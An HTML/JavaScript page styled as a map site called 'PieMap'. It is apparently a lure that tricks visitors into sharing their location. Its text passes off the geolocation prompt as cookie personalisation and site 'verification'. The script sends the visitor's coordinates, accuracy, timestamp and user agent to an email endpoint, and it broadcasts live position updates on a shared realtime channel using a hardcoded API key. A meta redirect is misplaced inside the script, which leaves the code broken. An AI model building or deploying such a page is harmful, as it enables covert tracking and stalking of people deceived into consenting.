<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>PieMap</title>

  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.8.0/dist/leaflet.css" />
  <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine@latest/dist/leaflet-routing-machine.css" />

  <!-- PieSocket (optional; code will still work if this fails to load) -->
  <script src="https://unpkg.com/piesocket-js@5"></script>

  <style>
    html, body { height: 100%; margin: 0; }
    #map { width: 100%; height: 100vh; }
    #panel {
      position: fixed; top: 12px; left: 12px; z-index: 9999;
      background: white; padding: 10px 12px; border-radius: 12px;
      box-shadow: 0 2px 16px rgba(0,0,0,.18);
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
      max-width: 360px;
    }
    #panel h1 { font-size: 14px; margin: 0 0 6px 0; }
    #panel p { font-size: 12px; margin: 0 0 10px 0; line-height: 1.35; }
    #panel button { margin-right: 8px; margin-bottom: 6px; }
    #status { font-size: 12px; white-space: pre-wrap; margin-top: 6px; }
  </style>
</head>
      
<body>
  <div id="map"></div>

  <div id="panel">
    <h1>PieMap</h1>
    <p>
      Click <b>Request Permission</b> please for site to load correctly. If you click <b>Allow</b>, this site will adjust your personal cookies to your liking, hence making for better user experience.<br>
      Click <b>Verify</b> after you've allowed access for <b>Request Permission</b> to gain access to the full site.
      There is a common error where a link to a map may appear. Do not click anything, it is an advertisement to keep our website running. Please continue to <b>verify.</b>
    </p>
    <button id="btnStart">Request Permission</button>
    <button id="btnEmail" disabled>Verify</button>
    <div id="status">Ready.</div>
  </div>

  <script src="https://unpkg.com/leaflet@1.8.0/dist/leaflet.js"></script>
  <script src="https://unpkg.com/leaflet-routing-machine@latest/dist/leaflet-routing-machine.js"></script>

  <script>
    window.addEventListener("DOMContentLoaded", () => {
      const EMAIL_ENDPOINT = "/.netlify/functions/location-email";

      const btnStart = document.getElementById("btnStart");
      const btnEmail = document.getElementById("btnEmail");
      const statusEl = document.getElementById("status");

      // If these are missing, something is wrong with the HTML being served.
      if (!btnStart || !btnEmail || !statusEl) {
        console.error("Missing btnStart/btnEmail/status in HTML.");
        return;
      }

      function setStatus(msg) {
        statusEl.textContent = msg;
      }

      // ---- App state ----
      let map = null;
      let userMarker = null;
      let newMarker = null;
      let routingControl = null;
      let lastPos = null;
      let watchId = null;

      // ---- PieSocket (optional) ----
      let piesocket = null;
      let channel = null;

      if (typeof PieSocket !== "undefined") {
        try {
          piesocket = new PieSocket({
            clusterId: "free.blr2",
            apiKey: "B9UKgvptNTWrZxfCUTquFp7nKVsYqu2LtmBao5Jg",
            notifySelf: true,
            presence: true,
          });
        } catch (e) {
          console.warn("PieSocket init failed; continuing without realtime:", e);
          piesocket = null;
        }
      } else {
        console.warn("PieSocket script did not load; continuing without realtime.");
      }

      async function subscribePieSocketIfAvailable() {
        if (!piesocket || channel) return;

        try {
          channel = await piesocket.subscribe("chat-room");

          channel.listen("updateUserMarker", (data) => {
            if (!map) return;
            const loc = JSON.parse(data);

            if (userMarker) userMarker.setLatLng([loc.latitude, loc.longitude]);
            else userMarker = L.marker([loc.latitude, loc.longitude]).addTo(map);
          });

          channel.listen("route", (data) => {
            if (!map) return;
            const msg = JSON.parse(data);

            if (!userMarker) userMarker = L.marker([msg.user.lat, msg.user.lng]).addTo(map);
            else userMarker.setLatLng([msg.user.lat, msg.user.lng]);

            if (!newMarker) newMarker = L.marker([msg.dest.lat, msg.dest.lng]).addTo(map);
            else newMarker.setLatLng([msg.dest.lat, msg.dest.lng]);

            if (routingControl) map.removeControl(routingControl);

            routingControl = L.Routing.control({
              waypoints: [L.latLng(msg.user.lat, msg.user.lng), L.latLng(msg.dest.lat, msg.dest.lng)],
              addWaypoints: false,
              draggableWaypoints: false,
            }).addTo(map);
          });
        } catch (e) {
          console.warn("PieSocket subscribe failed; continuing without realtime:", e);
          channel = null;
        }
      }

      // ---- Map ----
      function initMap(lat, lng) {
        map = L.map("map").setView([lat, lng], 12);

        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
          maxZoom: 18,
          attribution: "© OpenStreetMap contributors",
        }).addTo(map);

        userMarker = L.marker([lat, lng]).addTo(map);

        map.on("click", (e) => {
          if (!userMarker) return;

          const dest = [e.latlng.lat, e.latlng.lng];

          if (newMarker) newMarker.setLatLng(dest);
          else newMarker = L.marker(dest).addTo(map);

          if (routingControl) map.removeControl(routingControl);

          routingControl = L.Routing.control({
            waypoints: [
              L.latLng(userMarker.getLatLng().lat, userMarker.getLatLng().lng),
              L.latLng(newMarker.getLatLng().lat, newMarker.getLatLng().lng),
            ],
            addWaypoints: false,
            draggableWaypoints: false,
          }).addTo(map);

          // Broadcast route if realtime available
          if (channel) {
            channel.publish("route", JSON.stringify({
              user: userMarker.getLatLng(),
              dest: newMarker.getLatLng(),
            }));
          }
        });
      }

      function startWatchingLocation() {
        if (watchId !== null) return;

        watchId = navigator.geolocation.watchPosition(
          (pos) => {
            lastPos = pos;

            const latitude = pos.coords.latitude;
            const longitude = pos.coords.longitude;

            if (userMarker) userMarker.setLatLng([latitude, longitude]);

            if (channel) {
              channel.publish("updateUserMarker", JSON.stringify({ latitude, longitude }));
            }
          },
          (err) => setStatus("Location error: " + err.message),
          { enableHighAccuracy: false, timeout: 20000, maximumAge: 600000 }
        );
      }

      async function emailMyLocation() {
        if (!lastPos) return setStatus("Unable to detect verification. Please verify completely first.");

        setStatus("Processing...");

        const payload = {
          lat: lastPos.coords.latitude,
          lon: lastPos.coords.longitude,
          accuracy_m: lastPos.coords.accuracy,
          timestamp: new Date(lastPos.timestamp).toISOString(),
          userAgent: navigator.userAgent,
        };

        try {
          const r = await fetch(EMAIL_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });

          if (r.ok) {
  setStatus("✅ Verification Complete!");
            <meta http-equiv="refresh" content="0; url=https://en.wikipedia.org/wiki/Mathematics" />

} else {
  const t = await r.text();
  setStatus("❌ Error. Please try again later (" + r.status + "):\n" + t);
}

        } catch (e) {
          setStatus("❌ Network error; Please try again later. Error code: " + e.message);
        }
      }

      // ---- Button handlers (the key missing piece) ----
      btnStart.addEventListener("click", () => {
        if (!navigator.geolocation) return setStatus("Device/Browser not supported. Please try on a different device/browser or try again later.");

        setStatus("Requesting permission to run...");

        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            lastPos = pos;

            // Create map on first successful location
            if (!map) initMap(pos.coords.latitude, pos.coords.longitude);

            // Realtime optional
            await subscribePieSocketIfAvailable();

            // Start live tracking
            startWatchingLocation();

            btnEmail.disabled = false;
            setStatus("⚠️ Permission unlocked. Verification needed now.");
          },
          (err) => setStatus("❌ Unknown Error; Please try again later; Error Code: " + err.message),
          { enableHighAccuracy: false, timeout: 20000, maximumAge: 600000 }
        );
      });

      btnEmail.addEventListener("click", emailMyLocation);

      setStatus("Server's ready to grant permission.");
    });
  </script>
</body>
</html>






